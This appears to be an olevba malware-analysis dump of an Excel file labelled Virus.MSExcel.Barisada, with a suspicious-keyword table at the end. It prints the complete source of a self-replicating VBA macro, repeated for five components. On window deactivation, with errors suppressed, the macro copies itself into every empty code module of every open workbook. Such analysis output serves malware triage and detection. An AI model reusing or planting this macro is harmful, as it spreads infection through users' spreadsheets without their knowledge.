olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Barisada.s-13ffec54b2152c20a9e538568a0e49188d94e572
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSExcel.Barisada.s-13ffec54b2152c20a9e538568a0e49188d94e572 - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


Private Sub Workbook_WindowDeactivate(ByVal Wn As Excel.Window)
On Error Resume Next
flag = False
 

 
'ThisWorkbook Component에 코드가 있으면 vcode변수에 코드를 저장
For i = 1 To Workbooks.Count
  eline = Workbooks(i).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.CountOfLines
  If eline <> o Then vcode = Workbooks(i).VBProject.VBComponents.Item("thisworkbook").CodeModule.Lines(1, eline)
  
'코드가 없는 Component를 찾아서 vcode변수값을 입력
 For j = 1 To Workbooks(i).VBProject.VBComponents.Count
  vcount = Workbooks(i).VBProject.VBComponents.Item(j).CodeModule.CountOfLines
  If vcount = 0 Then Workbooks(i).VBProject.VBComponents.Item(j).CodeModule.AddFromString (vcode)
 Next j: Next i
  
  
 
End Sub






















































-------------------------------------------------------------------------------
VBA MACRO Sheet111.cls 
in file: Virus.MSExcel.Barisada.s-13ffec54b2152c20a9e538568a0e49188d94e572 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet111'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


Private Sub Workbook_WindowDeactivate(ByVal Wn As Excel.Window)
On Error Resume Next
flag = False
 

 
'ThisWorkbook Component에 코드가 있으면 vcode변수에 코드를 저장
For i = 1 To Workbooks.Count
  eline = Workbooks(i).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.CountOfLines
  If eline <> o Then vcode = Workbooks(i).VBProject.VBComponents.Item("thisworkbook").CodeModule.Lines(1, eline)
  
'코드가 없는 Component를 찾아서 vcode변수값을 입력
 For j = 1 To Workbooks(i).VBProject.VBComponents.Count
  vcount = Workbooks(i).VBProject.VBComponents.Item(j).CodeModule.CountOfLines
  If vcount = 0 Then Workbooks(i).VBProject.VBComponents.Item(j).CodeModule.AddFromString (vcode)
 Next j: Next i
  
  
 
End Sub






















































-------------------------------------------------------------------------------
VBA MACRO Sheet21.cls 
in file: Virus.MSExcel.Barisada.s-13ffec54b2152c20a9e538568a0e49188d94e572 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet21'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


Private Sub Workbook_WindowDeactivate(ByVal Wn As Excel.Window)
On Error Resume Next
flag = False
 

 
'ThisWorkbook Component에 코드가 있으면 vcode변수에 코드를 저장
For i = 1 To Workbooks.Count
  eline = Workbooks(i).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.CountOfLines
  If eline <> o Then vcode = Workbooks(i).VBProject.VBComponents.Item("thisworkbook").CodeModule.Lines(1, eline)
  
'코드가 없는 Component를 찾아서 vcode변수값을 입력
 For j = 1 To Workbooks(i).VBProject.VBComponents.Count
  vcount = Workbooks(i).VBProject.VBComponents.Item(j).CodeModule.CountOfLines
  If vcount = 0 Then Workbooks(i).VBProject.VBComponents.Item(j).CodeModule.AddFromString (vcode)
 Next j: Next i
  
  
 
End Sub






















































-------------------------------------------------------------------------------
VBA MACRO Sheet12.cls 
in file: Virus.MSExcel.Barisada.s-13ffec54b2152c20a9e538568a0e49188d94e572 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet12'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


Private Sub Workbook_WindowDeactivate(ByVal Wn As Excel.Window)
On Error Resume Next
flag = False
 

 
'ThisWorkbook Component에 코드가 있으면 vcode변수에 코드를 저장
For i = 1 To Workbooks.Count
  eline = Workbooks(i).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.CountOfLines
  If eline <> o Then vcode = Workbooks(i).VBProject.VBComponents.Item("thisworkbook").CodeModule.Lines(1, eline)
  
'코드가 없는 Component를 찾아서 vcode변수값을 입력
 For j = 1 To Workbooks(i).VBProject.VBComponents.Count
  vcount = Workbooks(i).VBProject.VBComponents.Item(j).CodeModule.CountOfLines
  If vcount = 0 Then Workbooks(i).VBProject.VBComponents.Item(j).CodeModule.AddFromString (vcode)
 Next j: Next i
  
  
 
End Sub






















































-------------------------------------------------------------------------------
VBA MACRO Sheet11.cls 
in file: Virus.MSExcel.Barisada.s-13ffec54b2152c20a9e538568a0e49188d94e572 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet11'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


Private Sub Workbook_WindowDeactivate(ByVal Wn As Excel.Window)
On Error Resume Next
flag = False
 

 
'ThisWorkbook Component에 코드가 있으면 vcode변수에 코드를 저장
For i = 1 To Workbooks.Count
  eline = Workbooks(i).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.CountOfLines
  If eline <> o Then vcode = Workbooks(i).VBProject.VBComponents.Item("thisworkbook").CodeModule.Lines(1, eline)
  
'코드가 없는 Component를 찾아서 vcode변수값을 입력
 For j = 1 To Workbooks(i).VBProject.VBComponents.Count
  vcount = Workbooks(i).VBProject.VBComponents.Item(j).CodeModule.CountOfLines
  If vcount = 0 Then Workbooks(i).VBProject.VBComponents.Item(j).CodeModule.AddFromString (vcode)
 Next j: Next i
  
  
 
End Sub






















































-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - 8
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

